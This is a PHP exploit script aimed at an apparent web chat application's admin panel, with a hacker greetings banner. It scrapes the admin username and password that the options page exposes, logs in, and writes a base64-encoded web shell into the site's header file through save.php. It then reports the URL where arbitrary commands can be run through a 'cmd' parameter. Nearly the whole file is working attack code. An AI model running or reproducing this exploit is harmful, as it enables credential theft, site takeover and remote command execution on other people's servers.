<?php

echo "########################################################\n";
echo "#   Special Greetings To - Timq,Warpboy,The-Maggot     #\n";
echo "########################################################\n\n\n";

$payload =
"JTNDJTNGcGhwK2lmJTI4aXNzZXQlMjglMjRfR0VUJTVCJTI3Y21kJTI3JTVEJTI5JTI5JTdCZWNobytzaGVsbF9leGVjJTI4dXJsZGVjb2RlJTI4JTI0X0dFVCU1QiUyN2NtZCUyNyU1RCUyOSUyOSUzQmRpZSUyOCUyO
SUzQiU3RCUzRiUzRQ==";
$payload = base64_decode($payload);


if($argc!=2) die("Usage: <url> \n\tEx: http://www.example.com/chatness/\n");

$url = $argv[1];

$ch = curl_init($url . "admin/options.php");
if(!$ch) die("Error Initializing CURL");

echo "[ ] Attempting To Fetch Admin Login...\n";
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ch);
if(!$res) die("Error Connecting To Target");

$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);
if($httpresult!=200) die("Error - URL Appears To Be Incorrect");

//Not good - but it works...sometimes
$junkarray = explode("id=",$res);
$junkarray = explode("\"",$junkarray[14]);
$username = $junkarray[3];

$junkarray = explode("id=",$res);
$junkarray = explode("\"",$junkarray[15]);
$password = $junkarray[3];

echo "[ ] Found Username And Password - ".$username." / ".$password."\n";
echo "[ ] Logging In...\n";

//Login
curl_setopt($ch, CURLOPT_URL,$url . "admin/login.php");
curl_setopt($ch, CURLOPT_COOKIEJAR, "mrcookie.dat");
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"user=".$username."&pass=".$password."&submit=Login");
$res = curl_exec($ch);
if(!res) die("Error Connecting To Target");

$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);
if($httpresult==200) die("Error Invalid Username/Password");

echo "[ ] Login Succeeded..\n";
//Deploy Main Payload
curl_setopt($ch, CURLOPT_URL,$url . "admin/save.php?file=head");
curl_setopt($ch, CURLOPT_COOKIEFILE, "mrcookie.dat");
curl_setopt($ch, CURLOPT_POSTFIELDS,"html=".$payload);
$res = curl_exec($ch);
if(!res) die("Error Connecting To Target");

echo "[ ] Payload Deployed\n";
echo "[ ] Shell Accessible at ".$url."index.php?cmd=<yourcommand>";
curl_close($ch);
?>
